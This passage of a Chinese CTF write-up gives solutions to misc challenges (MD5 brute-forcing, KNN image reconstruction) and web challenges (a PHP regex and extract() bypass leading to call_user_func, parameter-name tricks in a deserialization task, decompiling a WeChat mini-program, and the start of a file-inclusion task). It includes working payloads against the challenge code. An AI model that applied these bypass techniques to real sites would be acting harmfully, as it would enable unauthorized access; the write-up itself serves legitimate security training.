+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python 3.7 (3394)</span></span><br><span class="line"><span class="comment"># Compiled at: 1969-12-31 18:00:00</span></span><br><span class="line"><span class="comment">#Powered by BugScaner</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> re, hashlib, random</span><br><span class="line">flag = <span class="string">&#x27;flag&#123;jiu_bu_gao_su_ni&#125;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> re.fullmatch(<span class="string">&#x27;^flag&#123;[A-Z][0-9a-zA-Z]&#123;4&#125;&#125;$&#x27;</span>, flag):</span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    m.update(flag.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">    m = m.hexdigest()</span><br><span class="line">    col = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">24</span>, <span class="number">2</span>):</span><br><span class="line">        tmp = <span class="built_in">int</span>(m[i:i + <span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">        tmp += random.randint(-<span class="number">5</span>, <span class="number">5</span>)</span><br><span class="line">        col += [tmp]</span><br><span class="line"></span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="number">1024</span>, <span class="number">512</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        timg = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="number">256</span>, <span class="number">512</span>), <span class="built_in">tuple</span>(col[i * <span class="number">3</span>:i * <span class="number">3</span> + <span class="number">3</span>]))</span><br><span class="line">        img.paste(timg, (i * <span class="number">256</span>, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">    img.save(<span class="string">&#x27;C:/Users/Administrator/Desktop/setu.png&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>结合前面得到的图片可知 flag 的格式，尝试写脚本爆破 flag。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213953611917.e4a05c1c009b678edcb8b0c7ef39554151c066a1.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">colors = [<span class="number">139</span>, <span class="number">102</span>, <span class="number">162</span>, <span class="number">24</span>, <span class="number">85</span>, <span class="number">57</span>, <span class="number">160</span>, <span class="number">37</span>, <span class="number">239</span>, <span class="number">200</span>, <span class="number">154</span>, <span class="number">30</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">125</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">125</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">125</span>):</span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">125</span>):</span><br><span class="line">                flag = <span class="string">&quot;flag&#123;D&quot;</span> + <span class="built_in">chr</span>(i) + <span class="built_in">chr</span>(j) + <span class="built_in">chr</span>(k) + <span class="built_in">chr</span>(n) + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">                <span class="keyword">if</span> re.fullmatch(<span class="string">&#x27;^flag&#123;[A-Z][0-9a-zA-Z]&#123;4&#125;&#125;$&#x27;</span>, flag):</span><br><span class="line">                    m = hashlib.md5()</span><br><span class="line">                    m.update(flag.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">                    m = m.hexdigest()</span><br><span class="line">                    runCount = <span class="number">0</span></span><br><span class="line">                    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">24</span>, <span class="number">2</span>):</span><br><span class="line">                        color = colors[runCount]</span><br><span class="line">                        tmp = <span class="built_in">int</span>(m[x:x + <span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">                        <span class="keyword">if</span> -<span class="number">5</span> &lt; (tmp - color) &lt; <span class="number">5</span>:</span><br><span class="line">                            runCount += <span class="number">1</span></span><br><span class="line">                            <span class="keyword">continue</span></span><br><span class="line">                        <span class="keyword">elif</span> x == <span class="number">22</span>:  <span class="comment"># 23 - 1</span></span><br><span class="line">                            <span class="built_in">print</span>(flag)</span><br><span class="line">                            exit(<span class="number">0</span>)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>运行脚本可以得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;D4n1U&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="童话镇"><a href="#童话镇" class="headerlink" title="童话镇"></a>童话镇</h3><p>将文件分离解压之后得到训练集和 flag，从网上找了一段 KNN 的算法稍微修改一下即可算出 flag 的标签。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##给出训练数据以及对应的类别</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createDataSet</span>():</span></span><br><span class="line">    groups = []</span><br><span class="line">    labels = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;t.txt&quot;</span>):</span><br><span class="line">        group = []</span><br><span class="line">        label = line[<span class="number">0</span>]</span><br><span class="line">        line = line[<span class="number">2</span>:]</span><br><span class="line">        line = line.lstrip(<span class="string">&quot;[&quot;</span>).rstrip(<span class="string">&quot;]\n&quot;</span>).split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> line:</span><br><span class="line">            group.append(<span class="built_in">int</span>(x))</span><br><span class="line">        groups.append(group)</span><br><span class="line">        labels.append(label)</span><br><span class="line">    <span class="built_in">print</span>(groups)</span><br><span class="line">    <span class="keyword">return</span> array(groups), labels</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">###通过KNN进行分类</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">classify</span>(<span class="params"><span class="built_in">input</span>, dataSet, label, k</span>):</span></span><br><span class="line">    dataSize = dataSet.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">####计算欧式距离</span></span><br><span class="line">    diff = tile(<span class="built_in">input</span>, (dataSize, <span class="number">1</span>)) - dataSet</span><br><span class="line">    sqdiff = diff ** <span class="number">2</span></span><br><span class="line">    squareDist = <span class="built_in">sum</span>(sqdiff, axis=<span class="number">1</span>)  <span class="comment">###行向量分别相加，从而得到新的一个行向量</span></span><br><span class="line">    dist = squareDist ** <span class="number">0.5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">##对距离进行排序</span></span><br><span class="line">    sortedDistIndex = argsort(dist)  <span class="comment">##argsort()根据元素的值从大到小对元素进行排序，返回下标</span></span><br><span class="line"></span><br><span class="line">    classCount = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">        voteLabel = label[sortedDistIndex[i]]</span><br><span class="line">        <span class="comment">###对选取的K个样本所属的类别个数进行统计</span></span><br><span class="line">        classCount[voteLabel] = classCount.get(voteLabel, <span class="number">0</span>) + <span class="number">1</span></span><br><span class="line">    <span class="comment">###选取出现的类别次数最多的类别</span></span><br><span class="line">    maxCount = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> classCount.items():</span><br><span class="line">        <span class="keyword">if</span> value &gt; maxCount:</span><br><span class="line">            maxCount = value</span><br><span class="line">            classes = key</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> classes</span><br><span class="line"></span><br><span class="line">dataSet, labels = createDataSet()</span><br><span class="line">inputs = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>):</span><br><span class="line">    <span class="built_in">input</span> = []</span><br><span class="line">    line = line.lstrip(<span class="string">&quot;[&quot;</span>).rstrip(<span class="string">&quot;]\n&quot;</span>).split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> line:</span><br><span class="line">        <span class="built_in">input</span>.append(<span class="built_in">int</span>(x))</span><br><span class="line">    inputs.append(<span class="built_in">input</span>)</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;KNNresulta.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">input</span> <span class="keyword">in</span> inputs:</span><br><span class="line">    output = classify(array(<span class="built_in">input</span>), dataSet, labels, <span class="number">2</span>)</span><br><span class="line">    file.write(output)</span><br><span class="line">    <span class="built_in">print</span>(output)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
+
+<p>通过标签数量可以确定图片的尺寸，写脚本求出标签数量的约数。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">78289</span> // <span class="number">2</span> + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="number">78289</span> % x == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Found number &#123;&#125;&quot;</span>.<span class="built_in">format</span>(x))</span><br></pre></td></tr></table></figure>
+
+<p>很容易得出图片尺寸为 79x991。将标签转换为像素从而构建图片。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">flagFile = <span class="built_in">open</span>(<span class="string">&quot;KNNresulta.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">flagStream = flagFile.read().rstrip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">image = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">79</span>, <span class="number">991</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">79</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">991</span>):</span><br><span class="line">        pixel = (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="keyword">if</span> <span class="built_in">int</span>(flagStream[i * <span class="number">991</span> + j]) <span class="keyword">else</span> (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        image.putpixel((i, j), pixel)</span><br><span class="line">image = image.transpose(Image.FLIP_TOP_BOTTOM)</span><br><span class="line">image.save(<span class="string">&quot;result.png&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>将得到的图片顺时针旋转 90° 可得到如下图片。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213953764336.e361a2af8783d278d28d24e5e87083c0406244c2.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;67373永生_举报狗必须死&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="veryphp"><a href="#veryphp" class="headerlink" title="veryphp"></a>veryphp</h3><p>代码审计题目，给出的源代码如下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">qwq</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Access Denied!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">oao</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        show_source(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\`|\_|\.|%|\*|\~|\^|\&#x27;|\&quot;|\;|\(|\)|\]|g|e|l|i|\//is&#x27;</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;I am sorry but you have to leave.&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    extract(<span class="variable">$_POST</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$shaw_root</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\-[a-e][^a-zA-Z0-8]&lt;b&gt;(.*)&gt;&#123;4&#125;\D*?(abc.*?)p(hp)*\@R(s|r).$/&#x27;</span>, <span class="variable">$shaw_root</span>)&amp;&amp; strlen(<span class="variable">$shaw_root</span>)===<span class="number">29</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$hint</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Almost there.&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;Input correct parameters&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ans</span>===<span class="variable">$SecretNumber</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;Congratulations!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    call_user_func(<span class="variable">$my_ans</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先想办法拿到 hint，才能再去构造 <code>$SecretNumber</code>。因此先对着正则工具构造一串合理的字符串使之能到 <code>echo $hint;</code> 处。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213953880868.1644bad21e153b52561ddf0b8fbb70b4198966fa.png"></p>
+<p>接下来就是 <code>extract($_POST);</code> 设置的变量为 <code>shaw_root</code>，但是在 POST 的字符串中下划线被正则挡住了，因此使用空格来代替。写出这一部分的 payload，得到 hint。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shaw root&#x3D;-a9&lt;b&gt;aaaaaaaaaa&gt;&gt;&gt;&gt;aabcp@Rsa</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Here is a hint : md5(&quot;shaw&quot;.($SecretNumber).&quot;root&quot;)&#x3D;&#x3D;166b47a5cb1ca2431a0edfcef200684f &amp;&amp; strlen($SecretNumber)&#x3D;&#x3D;&#x3D;5</span><br></pre></td></tr></table></figure>
+
+<p>于是写个脚本跑一下这个 <code>$SecretNumber</code>，得到结果是 21475。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">99999</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$num</span> = sprintf(<span class="string">&quot;%05d&quot;</span>, <span class="variable">$i</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;shaw&quot;</span> . (<span class="variable">$num</span>) . <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="variable">$md5Str</span> = md5(<span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$md5Str</span> == <span class="string">&quot;166b47a5cb1ca2431a0edfcef200684f&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Found: &quot;</span> . <span class="variable">$num</span> . PHP_EOL;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Trying: &quot;</span> . <span class="variable">$num</span> . <span class="string">&quot; as &quot;</span> . <span class="variable">$md5Str</span> . PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>拿到 Congratulation 之后就是要想办法到达 <code>show_source(&quot;config.php&quot;)</code> 处。因为 <code>oao()</code> 是个静态方法，所以直接传入 <code>qwq::oao</code> 就能被 <code>call_user_func($my_ans)</code> 调用到。因此最后的 payload 如下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shaw root&#x3D;-a9&lt;b&gt;aaaaaaaaaa&gt;&gt;&gt;&gt;aabcp@Rsa&amp;ans&#x3D;21475&amp;my ans&#x3D;qwq::oao</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d66c779bdd97750eb2b0a6a34384b901&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="spaceman"><a href="#spaceman" class="headerlink" title="spaceman"></a>spaceman</h3><p>反序列化的代码审计，给出的代码如下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">spaceman</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;password===<span class="string">&#x27;ctfshowvip&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;wrong password&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;ctfshowup&#x27;</span>,<span class="string">&#x27;ctfshow&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\_|\.|\]|\[/is&#x27;</span>,<span class="variable">$str</span>))&#123;            </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;I am sorry but you have to leave.&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    extract(<span class="variable">$_POST</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ser</span> = filter(serialize(<span class="keyword">new</span> spaceman(<span class="variable">$user_name</span>,<span class="variable">$pass_word</span>)));</span><br><span class="line"><span class="variable">$test</span> = unserialize(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以发现给出了一个两个字符长边短的反序列化字符逃逸。但是跟到下面可以发现 <code>$pass_word</code> 其实是可控的。因此只需要构造如下 POST 参数就行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user[name&#x3D;lemonprefect&amp;pass[word&#x3D;ctfshowvip</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;661aa8e7-658d-4615-bec6-0479b2af71f1&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="有手就行"><a href="#有手就行" class="headerlink" title="有手就行"></a>有手就行</h3><p>传入 GET 参数 <code>.../?file=flag</code>，即可在源码种发现一张小程序码的图片的 base64 字符串，将其解码后可得如下图片。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213954003065.a82ea41977e509a00fbab32bbe9e807b226ca507.png"></p>
+<p>扫描之后可以发现是一个爬楼的小游戏，得爬到 54429731 层才能拿到 flag。可以反编译小程序来拿到 flag。</p>
+<blockquote>
+<p>插曲：Hyper-V 会导致 VT-x 无法被 Android 虚拟机使用。只需要暂时停用 Hyper-V 再重启即可。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /set hypervisorlaunchtype off  ;停用</span><br><span class="line">bcdedit /set hypervisorlaunchtype Auto ;恢复</span><br></pre></td></tr></table></figure>
+<p>注意：一旦停用了 Hyper-V 可能需要重新勾选 Hyper-V 的 Windows 功能才能恢复。</p>
+</blockquote>
+<p>将微信小程序的程序包从 <code>/data/data/com.tencent.mm/MicroMsg/bf10a35efc5fc9b37707a65b7f678057/appbrand/pkg</code> 下取出。使用 <code>wuWxapkg.js</code> 将其反编译后在生成的目录的 <code>pages/index</code> 下可以找到 index.js。将其打开可以发现其中记录着如下内容。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">decode: <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;flag&#123;hahahawxunapk&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;hahahawxunapk&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="虎山行"><a href="#虎山行" class="headerlink" title="虎山行"></a>虎山行</h3><p>在 <code>../mc-admin/page-edit.php</code> 页面下发现任意文件包含漏洞，但是读取不到 flag。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213954130695.155ac50574af2de72c0e6d26082fd0b2f23a5bc1.png"></p>
+<p>访问上面给出的新路由，得到如下源码。</p>
